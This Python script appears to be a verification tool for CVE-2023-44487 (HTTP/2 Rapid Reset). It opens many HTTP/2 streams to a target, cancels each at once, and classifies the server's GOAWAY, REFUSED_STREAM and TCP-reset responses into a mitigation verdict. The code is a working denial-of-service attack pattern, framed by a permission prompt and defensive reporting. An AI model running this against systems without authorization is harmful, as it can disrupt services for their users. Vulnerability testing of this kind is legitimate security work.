#!/usr/bin/env python3
"""
CVE-2023-44487 HTTP/2 Rapid Reset Attack Verification Script (Enhanced)

Enhancements over the original:
  * Captures and logs the server's initial SETTINGS frame (MAX_CONCURRENT_STREAMS, etc.)
  * Logs every GOAWAY frame, including the error code -- this is the definitive
    signal of CVE-2023-44487 fix enforcement (ENHANCE_YOUR_CALM = 11)
  * Tracks per-second reset rate within a connection to detect adaptive throttling
  * Classifies connection close cause: GOAWAY (clean), GOAWAY (ENHANCE_YOUR_CALM),
    TCP reset, or no close (server let us finish)
  * Stronger end-of-test verdict based on actual enforcement signals,
    not just raw reset throughput

Author: MSR (original) / Enhanced for enforcement-signal detection
"""

import asyncio
import ssl
import time
import argparse
import logging
from typing import Optional, Tuple, List, Dict, Any
import statistics

try:
    import h2.connection
    import h2.events
    import h2.exceptions
    import h2.config
    import h2.settings
    import h2.errors
except ImportError:
    print("Error: h2 library not installed. Install with: pip install h2")
    exit(1)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


# Human-readable HTTP/2 error codes (RFC 9113 Section 7)
H2_ERROR_CODES = {
    0x0: "NO_ERROR",
    0x1: "PROTOCOL_ERROR",
    0x2: "INTERNAL_ERROR",
    0x3: "FLOW_CONTROL_ERROR",
    0x4: "SETTINGS_TIMEOUT",
    0x5: "STREAM_CLOSED",
    0x6: "FRAME_SIZE_ERROR",
    0x7: "REFUSED_STREAM",
    0x8: "CANCEL",
    0x9: "COMPRESSION_ERROR",
    0xa: "CONNECT_ERROR",
    0xb: "ENHANCE_YOUR_CALM",   # <-- KEY SIGNAL for CVE-2023-44487 enforcement
    0xc: "INADEQUATE_SECURITY",
    0xd: "HTTP_1_1_REQUIRED",
}


def err_name(code: int) -> str:
    return H2_ERROR_CODES.get(code, f"UNKNOWN(0x{code:x})")


class HTTP2RapidResetTester:
    """Class to test for CVE-2023-44487 HTTP/2 Rapid Reset vulnerability."""

    def __init__(self, host: str, port: int = 443, use_ssl: bool = True, connection_id: int = 1):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.connection_id = connection_id
        self.connection = None
        self.reader = None
        self.writer = None
        self.response_times = []
        self.errors = []
        self.connection_closed = False

        # --- Enforcement signal tracking ---
        self.server_settings: Dict[str, int] = {}         # initial SETTINGS from server
        self.goaway_events: List[Dict[str, Any]] = []     # all GOAWAY frames received
        self.stream_resets_from_server: List[Dict[str, Any]] = []  # RST_STREAM frames *from* server
        self.reset_timestamps: List[float] = []           # for per-second rate analysis
        self.close_cause: str = "unknown"                 # final classification
        self.tcp_reset_detected: bool = False
        self.new_streams_refused: int = 0                 # REFUSED_STREAM count

    async def connect(self) -> bool:
        """Establish HTTP/2 connection to the target server."""
        try:
            logger.info(f"[Conn {self.connection_id}] Connecting to {self.host}:{self.port}")

            if self.use_ssl:
                ssl_context = ssl.create_default_context()
                ssl_context.set_alpn_protocols(['h2'])
                self.reader, self.writer = await asyncio.open_connection(
                    self.host, self.port, ssl=ssl_context
                )
            else:
                self.reader, self.writer = await asyncio.open_connection(self.host, self.port)

            # Initialize HTTP/2 connection
            config = h2.config.H2Configuration(client_side=True)
            self.connection = h2.connection.H2Connection(config=config)
            self.connection.initiate_connection()

            # Send connection preface
            await self._send_data(self.connection.data_to_send())

            # Read the server's initial SETTINGS frame
            await self._capture_initial_settings()

            logger.info(f"[Conn {self.connection_id}] HTTP/2 connection established successfully")
            self.connection_closed = False
            return True

        except Exception as e:
            logger.error(f"[Conn {self.connection_id}] Failed to establish connection: {e}")
            return False

    async def _capture_initial_settings(self, timeout: float = 3.0):
        """Read and log the server's initial SETTINGS frame."""
        try:
            data = await asyncio.wait_for(self.reader.read(65535), timeout=timeout)
            if not data:
                return
            events = self.connection.receive_data(data)
            # Echo our SETTINGS ACK / any frames back out
            await self._send_data(self.connection.data_to_send())

            for event in events:
                if isinstance(event, h2.events.RemoteSettingsChanged):
                    for setting_code, change in event.changed_settings.items():
                        try:
                            name = h2.settings.SettingCodes(setting_code).name
                        except ValueError:
                            name = f"UNKNOWN(0x{setting_code:x})"
                        self.server_settings[name] = change.new_value
                    logger.info(
                        f"[Conn {self.connection_id}] Server SETTINGS: {self.server_settings}"
                    )
        except asyncio.TimeoutError:
            logger.debug(f"[Conn {self.connection_id}] No initial SETTINGS within {timeout}s")
        except Exception as e:
            logger.debug(f"[Conn {self.connection_id}] Error capturing SETTINGS: {e}")

    async def _send_data(self, data: bytes):
        """Send data to the server."""
        if data and self.writer and not self.connection_closed:
            try:
                self.writer.write(data)
                await self.writer.drain()
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.debug(f"Connection error while sending data: {e}")
                self.connection_closed = True
                self.tcp_reset_detected = isinstance(e, ConnectionResetError)
                if self.close_cause == "unknown":
                    self.close_cause = "tcp_reset" if self.tcp_reset_detected else "broken_pipe"

    async def _receive_data(self, timeout: float = 5.0) -> bytes:
        """Receive data from the server."""
        try:
            if self.connection_closed or not self.reader:
                return b''
            data = await asyncio.wait_for(self.reader.read(65535), timeout=timeout)
            if not data:
                self.connection_closed = True
                if self.close_cause == "unknown":
                    self.close_cause = "eof_no_goaway"
            return data
        except asyncio.TimeoutError:
            return b''
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            logger.debug(f"Connection error while receiving data: {e}")
            self.connection_closed = True
            self.tcp_reset_detected = isinstance(e, ConnectionResetError)
            if self.close_cause == "unknown":
                self.close_cause = "tcp_reset" if self.tcp_reset_detected else "recv_error"
            return b''

    def _process_events(self, events):
        """Process HTTP/2 events and capture enforcement signals."""
        for event in events:
            if isinstance(event, h2.events.ConnectionTerminated):
                # This is a GOAWAY frame
                code = int(event.error_code) if event.error_code is not None else 0
                entry = {
                    "error_code": code,
                    "error_name": err_name(code),
                    "last_stream_id": event.last_stream_id,
                    "additional_data": (
                        event.additional_data.decode("utf-8", errors="replace")
                        if event.additional_data else ""
                    ),
                    "timestamp": time.time(),
                }
                self.goaway_events.append(entry)
                self.connection_closed = True

                if code == 0xb:
                    self.close_cause = "goaway_enhance_your_calm"
                    logger.warning(
                        f"[Conn {self.connection_id}] *** GOAWAY ENHANCE_YOUR_CALM "
                        f"received (last_stream_id={event.last_stream_id}) -- "
                        f"server is actively rate-limiting CVE-2023-44487 pattern"
                    )
                else:
                    self.close_cause = f"goaway_{entry['error_name'].lower()}"
                    logger.info(
                        f"[Conn {self.connection_id}] GOAWAY {entry['error_name']} "
                        f"(last_stream_id={event.last_stream_id})"
                    )

            elif isinstance(event, h2.events.StreamReset):
                # Server sent us a RST_STREAM
                code = int(event.error_code) if event.error_code is not None else 0
                self.stream_resets_from_server.append({
                    "stream_id": event.stream_id,
                    "error_code": code,
                    "error_name": err_name(code),
                    "timestamp": time.time(),
                })
                if code == 0x7:  # REFUSED_STREAM
                    self.new_streams_refused += 1

            elif isinstance(event, h2.events.RemoteSettingsChanged):
                for setting_code, change in event.changed_settings.items():
                    try:
                        name = h2.settings.SettingCodes(setting_code).name
                    except ValueError:
                        name = f"UNKNOWN(0x{setting_code:x})"
                    self.server_settings[name] = change.new_value

    async def rapid_reset_test(self, num_streams: int = 100, delay: float = 0.001) -> dict:
        """
        Perform the rapid reset attack test.

        Returns dictionary with test results including enforcement signals.
        """
        logger.info(f"[Conn {self.connection_id}] Starting rapid reset test with {num_streams} streams")

        start_time = time.time()
        created_streams = []
        reset_streams = []

        try:
            # Phase 1: Rapidly create streams
            for i in range(num_streams):
                if self.connection_closed:
                    logger.warning(f"[Conn {self.connection_id}] Connection closed during stream creation")
                    break

                stream_id = (i * 2) + 1

                headers = [
                    (':method', 'GET'),
                    (':path', '/'),
                    (':scheme', 'https' if self.use_ssl else 'http'),
                    (':authority', self.host),
                    ('user-agent', 'CVE-2023-44487-Tester/1.1'),
                ]

                try:
                    self.connection.send_headers(stream_id, headers)
                    await self._send_data(self.connection.data_to_send())
                    created_streams.append(stream_id)

                    if delay > 0:
                        await asyncio.sleep(delay)

                except Exception as e:
                    self.errors.append(f"Error creating stream {stream_id}: {e}")
                    if "connection" in str(e).lower():
                        break

            logger.info(f"[Conn {self.connection_id}] Created {len(created_streams)} streams")

            # Phase 2: Rapidly reset all streams
            reset_start = time.time()
            for stream_id in created_streams:
                if self.connection_closed:
                    logger.warning(f"[Conn {self.connection_id}] Connection closed during stream reset")
                    break

                try:
                    self.connection.reset_stream(stream_id, error_code=0x8)  # CANCEL
                    await self._send_data(self.connection.data_to_send())
                    reset_streams.append(stream_id)
                    self.reset_timestamps.append(time.time())

                    # Opportunistically read any inbound frames (GOAWAY etc.) without blocking long
                    try:
                        data = await asyncio.wait_for(self.reader.read(65535), timeout=0.0001)
                        if data:
                            events = self.connection.receive_data(data)
                            self._process_events(events)
                            await self._send_data(self.connection.data_to_send())
                    except (asyncio.TimeoutError, BlockingIOError):
                        pass
                    except Exception:
                        pass

                    if delay > 0:
                        await asyncio.sleep(delay / 10)

                except h2.exceptions.StreamClosedError:
                    pass
                except Exception as e:
                    self.errors.append(f"Error resetting stream {stream_id}: {e}")
                    if "connection" in str(e).lower():
                        break

            reset_duration = time.time() - reset_start
            total_duration = time.time() - start_time

            logger.info(
                f"[Conn {self.connection_id}] Reset {len(reset_streams)} streams "
                f"in {reset_duration:.3f}s"
            )

            # Phase 3: Monitor server response (capture late GOAWAY etc.)
            await self._monitor_server_response(timeout=10.0)

            # Compute per-second reset rate buckets to detect adaptive throttling
            reset_rate_buckets = self._compute_per_second_buckets(reset_start)

            # If connection is still open and no GOAWAY came, classify accordingly
            if not self.connection_closed and self.close_cause == "unknown":
                self.close_cause = "no_close_no_enforcement"
            elif self.connection_closed and self.close_cause == "unknown":
                self.close_cause = "closed_unknown"

            return {
                'connection_id': self.connection_id,
                'streams_created': len(created_streams),
                'streams_reset': len(reset_streams),
                'total_duration': total_duration,
                'reset_duration': reset_duration,
                'reset_rate': len(reset_streams) / reset_duration if reset_duration > 0 else 0,
                'errors': len(self.errors),
                'response_times': self.response_times.copy(),
                'avg_response_time': statistics.mean(self.response_times) if self.response_times else 0,
                'connection_closed': self.connection_closed,
                # Enforcement signals
                'server_settings': self.server_settings,
                'goaway_events': self.goaway_events,
                'server_resets_count': len(self.stream_resets_from_server),
                'new_streams_refused': self.new_streams_refused,
                'close_cause': self.close_cause,
                'tcp_reset_detected': self.tcp_reset_detected,
                'per_second_reset_rates': reset_rate_buckets,
            }

        except Exception as e:
            logger.error(f"[Conn {self.connection_id}] Error during rapid reset test: {e}")
            return {'error': str(e), 'connection_id': self.connection_id}

    def _compute_per_second_buckets(self, reset_start: float) -> List[int]:
        """Bucket reset timestamps into 1-second windows to spot throttling."""
        if not self.reset_timestamps:
            return []
        buckets: List[int] = []
        end = self.reset_timestamps[-1]
        t = reset_start
        idx = 0
        while t <= end:
            count = 0
            while idx < len(self.reset_timestamps) and self.reset_timestamps[idx] < t + 1.0:
                count += 1
                idx += 1
            buckets.append(count)
            t += 1.0
        return buckets

    async def _monitor_server_response(self, timeout: float = 10.0):
        """Monitor server responses and measure response times."""
        logger.info(f"[Conn {self.connection_id}] Monitoring server responses...")

        end_time = time.time() + timeout

        while time.time() < end_time and not self.connection_closed:
            try:
                start = time.time()
                data = await self._receive_data()
                response_time = time.time() - start

                if data:
                    self.response_times.append(response_time)
                    try:
                        events = self.connection.receive_data(data)
                        self._process_events(events)
                        await self._send_data(self.connection.data_to_send())
                    except Exception as e:
                        logger.debug(f"Error processing HTTP/2 events: {e}")

                await asyncio.sleep(0.1)

            except Exception as e:
                self.errors.append(f"Error monitoring response: {e}")
                break

    async def baseline_test(self, num_requests: int = 10) -> dict:
        """Perform baseline test with normal HTTP/2 requests."""
        logger.info(f"[Conn {self.connection_id}] Performing baseline test with {num_requests} normal requests")

        start_time = time.time()
        successful_requests = 0

        for i in range(num_requests):
            if self.connection_closed:
                logger.warning(f"[Conn {self.connection_id}] Connection closed during baseline test")
                break

            stream_id = (i * 2) + 1

            headers = [
                (':method', 'GET'),
                (':path', '/'),
                (':scheme', 'https' if self.use_ssl else 'http'),
                (':authority', self.host),
                ('user-agent', 'CVE-2023-44487-Baseline/1.1'),
            ]

            try:
                request_start = time.time()
                self.connection.send_headers(stream_id, headers)
                self.connection.end_stream(stream_id)
                await self._send_data(self.connection.data_to_send())

                try:
                    data = await asyncio.wait_for(self._receive_data(), timeout=5.0)
                    if data:
                        self.response_times.append(time.time() - request_start)
                        successful_requests += 1
                        try:
                            events = self.connection.receive_data(data)
                            self._process_events(events)
                        except Exception:
                            pass
                except asyncio.TimeoutError:
                    logger.warning(f"[Conn {self.connection_id}] Timeout waiting for response to request {i+1}")

                await asyncio.sleep(0.1)

            except Exception as e:
                logger.warning(f"[Conn {self.connection_id}] Error in baseline request {i+1}: {e}")
                if "connection" in str(e).lower():
                    break

        total_duration = time.time() - start_time

        return {
            'total_requests': num_requests,
            'successful_requests': successful_requests,
            'total_duration': total_duration,
            'avg_response_time': statistics.mean(self.response_times) if self.response_times else 0,
            'success_rate': successful_requests / num_requests if num_requests > 0 else 0,
            'server_settings': self.server_settings,
        }

    async def close(self):
        """Close the connection gracefully."""
        if self.writer and not self.connection_closed:
            try:
                if self.connection:
                    try:
                        self.connection.close_connection()
                        await self._send_data(self.connection.data_to_send())
                    except Exception as e:
                        logger.debug(f"Error sending GOAWAY frame: {e}")

                self.writer.close()

                try:
                    await asyncio.wait_for(self.writer.wait_closed(), timeout=2.0)
                except asyncio.TimeoutError:
                    logger.debug("Timeout waiting for connection to close")
                except (ConnectionResetError, BrokenPipeError, OSError):
                    pass

            except Exception as e:
                logger.debug(f"Error during connection cleanup: {e}")
            finally:
                self.connection_closed = True


async def run_multiple_connections(host: str, port: int, use_ssl: bool,
                                   num_connections: int, streams: int, delay: float) -> list:
    """Run tests with multiple concurrent connections."""
    print("\n" + "=" * 60)
    print(f"MULTIPLE CONNECTION TEST ({num_connections} connections)")
    print("=" * 60)
    print(f"Each connection will test with {streams} streams")
    print()

    tasks = []
    for conn_id in range(1, num_connections + 1):
        tester = HTTP2RapidResetTester(host, port, use_ssl, connection_id=conn_id)

        async def run_test(t, cid):
            try:
                if await t.connect():
                    result = await t.rapid_reset_test(streams, delay)
                    await t.close()
                    return result
                else:
                    return {'error': 'Connection failed', 'connection_id': cid}
            except Exception as e:
                logger.error(f"[Conn {cid}] Test failed: {e}")
                return {'error': str(e), 'connection_id': cid}

        tasks.append(run_test(tester, conn_id))

    logger.info(f"Starting {num_connections} concurrent connections...")
    results = await asyncio.gather(*tasks)
    return list(results)


def render_verdict(successful_tests: List[dict]) -> None:
    """Render the enforcement-aware verdict block."""
    print("\n" + "=" * 60)
    print("ENFORCEMENT SIGNAL ANALYSIS")
    print("=" * 60)

    # Aggregate signals
    enhance_your_calm_count = 0
    other_goaway_count = 0
    no_goaway_count = 0
    tcp_reset_count = 0
    total_server_resets = 0
    total_refused_streams = 0
    settings_samples: List[dict] = []
    throttle_evidence_conns = 0

    for r in successful_tests:
        goaways = r.get('goaway_events', [])
        if any(g['error_code'] == 0xb for g in goaways):
            enhance_your_calm_count += 1
        elif goaways:
            other_goaway_count += 1
        else:
            no_goaway_count += 1

        if r.get('tcp_reset_detected'):
            tcp_reset_count += 1

        total_server_resets += r.get('server_resets_count', 0)
        total_refused_streams += r.get('new_streams_refused', 0)

        if r.get('server_settings'):
            settings_samples.append(r['server_settings'])

        # Detect adaptive throttling: late buckets significantly lower than early ones
        buckets = r.get('per_second_reset_rates', [])
        if len(buckets) >= 3:
            first_half = buckets[: len(buckets) // 2]
            second_half = buckets[len(buckets) // 2:]
            if first_half and second_half:
                fh = statistics.mean(first_half)
                sh = statistics.mean(second_half)
                if fh > 0 and sh < fh * 0.6:
                    throttle_evidence_conns += 1

    # Print SETTINGS
    if settings_samples:
        first = settings_samples[0]
        print("Server SETTINGS (initial frame):")
        for k, v in first.items():
            print(f"  {k} = {v}")
        max_streams = first.get("MAX_CONCURRENT_STREAMS")
        if max_streams is not None:
            if max_streams <= 100:
                print(f"  → MAX_CONCURRENT_STREAMS={max_streams} is conservative (good post-CVE default)")
            elif max_streams <= 1000:
                print(f"  → MAX_CONCURRENT_STREAMS={max_streams} is permissive")
            else:
                print(f"  → MAX_CONCURRENT_STREAMS={max_streams} is HIGH — no meaningful limit")
        print()
    else:
        print("Server SETTINGS: not captured")
        print()

    # Print GOAWAY breakdown
    n = len(successful_tests)
    print("GOAWAY breakdown across connections:")
    print(f"  ENHANCE_YOUR_CALM (0xb): {enhance_your_calm_count}/{n}")
    print(f"  Other GOAWAY codes:      {other_goaway_count}/{n}")
    print(f"  No GOAWAY received:      {no_goaway_count}/{n}")
    print(f"  TCP reset (RST at transport): {tcp_reset_count}/{n}")
    print(f"  Total RST_STREAM frames from server: {total_server_resets}")
    print(f"  REFUSED_STREAM frames from server:   {total_refused_streams}")
    print(f"  Connections showing adaptive throttling: {throttle_evidence_conns}/{n}")
    print()

    # Final verdict
    print("=" * 60)
    print("VERDICT")
    print("=" * 60)

    if enhance_your_calm_count > 0:
        print("✅ ENFORCEMENT CONFIRMED")
        print(f"   {enhance_your_calm_count}/{n} connection(s) received GOAWAY with ENHANCE_YOUR_CALM (0xb).")
        print("   This is the canonical signal that the CVE-2023-44487 mitigation is active.")
        print("   Classification: NOT VULNERABLE — protocol-layer enforcement is engaged.")
    elif tcp_reset_count >= n * 0.5:
        print("⚠️  EDGE/TRANSPORT-LEVEL INTERVENTION DETECTED")
        print(f"   {tcp_reset_count}/{n} connection(s) terminated via TCP reset.")
        print("   This suggests edge appliance or DDoS protection engaged, but not via")
        print("   the HTTP/2 protocol's own rate-limiting mechanism.")
        print("   Classification: LIKELY PROTECTED — verify with edge/Akamai team.")
    elif throttle_evidence_conns >= n * 0.5:
        print("⚠️  ADAPTIVE THROTTLING DETECTED")
        print(f"   {throttle_evidence_conns}/{n} connection(s) showed reset rate dropping over time.")
        print("   Server or edge appears to be slowing the attack adaptively.")
        print("   Classification: PARTIAL PROTECTION — confirm policy with infra team.")
    elif total_refused_streams > 0:
        print("⚠️  STREAM REFUSAL DETECTED")
        print(f"   Server sent {total_refused_streams} REFUSED_STREAM frame(s).")
        print("   Some rate-limiting is in place, but the attack was largely not blocked.")
        print("   Classification: PARTIAL PROTECTION — review limits.")
    else:
        print("❌ NO PROTOCOL-LAYER ENFORCEMENT OBSERVED")
        print("   No ENHANCE_YOUR_CALM GOAWAY frames, no TCP resets mid-attack,")
        print("   no adaptive throttling, no REFUSED_STREAM responses.")
        print("   The HTTP/2 rapid-reset vector is exercisable end-to-end at this scale.")
        print()
        print("   IMPORTANT: This does NOT prove the service can be DoS'd. Edge volumetric/")
        print("   behavioral protections (Akamai DoS Protection, Bot Manager, Client")
        print("   Reputation) may engage at higher attack scale or with different patterns.")
        print()
        print("   Classification: VECTOR EXERCISABLE — exploitability unconfirmed.")
        print("   Recommend documenting as 'Risk Accepted — Infrastructure Managed'")
        print("   or escalating to Akamai to confirm HTTP/2-specific rate controls are configured.")


async def main():
    parser = argparse.ArgumentParser(
        description='CVE-2023-44487 HTTP/2 Rapid Reset Vulnerability Tester (Enhanced)',
        epilog='WARNING: Only use on systems you own or have permission to test!'
    )
    parser.add_argument('host', help='Target hostname')
    parser.add_argument('-p', '--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('--no-ssl', action='store_true', help='Disable SSL/TLS')
    parser.add_argument('-s', '--streams', type=int, default=1000,
                        help='Number of streams for rapid reset test (default: 1000)')
    parser.add_argument('-d', '--delay', type=float, default=0.001,
                        help='Delay between stream operations (default: 0.001s)')
    parser.add_argument('-c', '--connections', type=int, default=1,
                        help='Number of concurrent connections to test (default: 1)')
    parser.add_argument('--baseline-only', action='store_true',
                        help='Only perform baseline test')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    print("=" * 60)
    print("CVE-2023-44487 HTTP/2 Rapid Reset Vulnerability Tester (Enhanced)")
    print("=" * 60)
    print(f"Target: {args.host}:{args.port}")
    print(f"SSL: {'Enabled' if not args.no_ssl else 'Disabled'}")
    print(f"Concurrent Connections: {args.connections}")
    print(f"Streams per Connection: {args.streams}")
    print()

    print("LEGAL DISCLAIMER:")
    print("This tool is for authorized security testing only.")
    print("Ensure you have permission to test the target system.")
    print("Unauthorized use may be illegal.")
    print()

    response = input("Do you have permission to test this system? (yes/no): ")
    if response.lower() != 'yes':
        print("Exiting. Only use this tool on systems you're authorized to test.")
        return

    tester = HTTP2RapidResetTester(args.host, args.port, not args.no_ssl)

    try:
        if not await tester.connect():
            logger.error("Failed to establish connection. Exiting.")
            return

        # Baseline test
        print("\n" + "=" * 40)
        print("BASELINE TEST")
        print("=" * 40)
        baseline_results = await tester.baseline_test()

        print(f"Baseline Results:")
        print(f"  Total Requests: {baseline_results['total_requests']}")
        print(f"  Successful: {baseline_results['successful_requests']}")
        print(f"  Success Rate: {baseline_results['success_rate']:.2%}")
        print(f"  Avg Response Time: {baseline_results['avg_response_time']:.3f}s")
        print(f"  Total Duration: {baseline_results['total_duration']:.3f}s")
        if baseline_results.get('server_settings'):
            print(f"  Server SETTINGS: {baseline_results['server_settings']}")

        if not args.baseline_only:
            await tester.close()

            rapid_results = await run_multiple_connections(
                args.host, args.port, not args.no_ssl,
                args.connections, args.streams, args.delay
            )

            print("\n" + "=" * 60)
            print("INDIVIDUAL CONNECTION RESULTS")
            print("=" * 60)

            successful_tests = []
            failed_tests = []

            for result in rapid_results:
                conn_id = result.get('connection_id', 'Unknown')
                if 'error' in result:
                    failed_tests.append(result)
                    print(f"\n[Connection {conn_id}] ❌ FAILED")
                    print(f"  Error: {result['error']}")
                else:
                    successful_tests.append(result)
                    print(f"\n[Connection {conn_id}] ✅ SUCCESS")
                    print(f"  Streams Created: {result['streams_created']}")
                    print(f"  Streams Reset: {result['streams_reset']}")
                    print(f"  Reset Rate: {result['reset_rate']:.1f} resets/second")
                    print(f"  Total Duration: {result['total_duration']:.3f}s")
                    print(f"  Errors: {result['errors']}")
                    print(f"  Connection Closed: {result.get('connection_closed', False)}")
                    print(f"  Close Cause: {result.get('close_cause', 'unknown')}")
                    goaways = result.get('goaway_events', [])
                    if goaways:
                        for g in goaways:
                            print(f"  GOAWAY: {g['error_name']} (0x{g['error_code']:x}), "
                                  f"last_stream_id={g['last_stream_id']}"
                                  + (f", data={g['additional_data']!r}" if g['additional_data'] else ""))
                    else:
                        print(f"  GOAWAY: none received")
                    if result.get('server_resets_count'):
                        print(f"  RST_STREAM frames from server: {result['server_resets_count']}")
                    if result.get('new_streams_refused'):
                        print(f"  REFUSED_STREAM count: {result['new_streams_refused']}")
                    buckets = result.get('per_second_reset_rates', [])
                    if buckets:
                        print(f"  Per-second reset buckets: {buckets}")

            if successful_tests:
                # Original aggregate block
                print("\n" + "=" * 60)
                print("AGGREGATE RESULTS")
                print("=" * 60)

                total_streams_created = sum(r['streams_created'] for r in successful_tests)
                total_streams_reset = sum(r['streams_reset'] for r in successful_tests)
                avg_reset_rate = statistics.mean(r['reset_rate'] for r in successful_tests)
                max_reset_rate = max(r['reset_rate'] for r in successful_tests)
                min_reset_rate = min(r['reset_rate'] for r in successful_tests)

                print(f"  Successful Connections: {len(successful_tests)}/{args.connections}")
                print(f"  Failed Connections: {len(failed_tests)}/{args.connections}")
                print(f"  Total Streams Created: {total_streams_created}")
                print(f"  Total Streams Reset: {total_streams_reset}")
                print(f"  Average Reset Rate: {avg_reset_rate:.1f} resets/sec")
                print(f"  Maximum Reset Rate: {max_reset_rate:.1f} resets/sec")
                print(f"  Minimum Reset Rate: {min_reset_rate:.1f} resets/sec")

                connections_closed = sum(1 for r in successful_tests if r.get('connection_closed', False))
                if connections_closed > 0:
                    print(f"  Connections Closed by Server: {connections_closed}/{len(successful_tests)}")

                # New enforcement-aware verdict
                render_verdict(successful_tests)
            else:
                print("\n❌ All connection tests failed. Cannot perform vulnerability analysis.")

    except KeyboardInterrupt:
        print("\nTest interrupted by user")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
    finally:
        try:
            await tester.close()
        except Exception as e:
            logger.debug(f"Error during final cleanup: {e}")
        print("\nTest completed.")


if __name__ == "__main__":
    print("CVE-2023-44487 HTTP/2 Rapid Reset Vulnerability Tester (Enhanced)")
    print("Requires: pip install h2")
    print()

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
